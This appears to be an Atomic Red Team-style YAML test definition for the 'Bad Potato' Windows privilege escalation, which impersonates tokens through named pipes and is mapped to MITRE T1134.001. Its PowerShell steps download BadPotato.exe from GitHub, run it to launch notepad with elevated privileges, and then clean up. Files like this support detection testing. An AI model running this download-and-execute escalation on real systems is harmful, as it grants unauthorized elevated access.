api_version: "2.0"
name: Bad Potato
description: |-
    https://github.com/BeichenDream/BadPotato
    Privilege escalation using named pipe connections
uuid: 9c6d799b-c111-4749-a42f-ec2f8cb51448
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
        - 'TA0004: Privilege Escalation'
    techniques:
        - 'T1134: Access Token Manipulation'
    subtechniques:
        - 'T1134.001: Token Impersonation/Theft'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        BadPotato.exe must exist in the temp directory
      inline: |
        if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\BadPotato.exe" "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.001/bin/BadPotato.exe?raw=true"
        }}
      executor: powershell
    - name: bad-potato
      inline: |
        cd "PathToAtomicsFolder\..\ExternalPayloads"
        Start-Process .\BadPotato.exe notepad.exe
        Start-Sleep -Second 20
        Stop-Process -Name "notepad" -force -erroraction silentlycontinue
        Stop-Process -Name "BadPotato" -force -erroraction silentlycontinue
      executor: powershell
      cleanup:
        inline: |
            taskkill /f /im notepad.exe
        executor: powershell
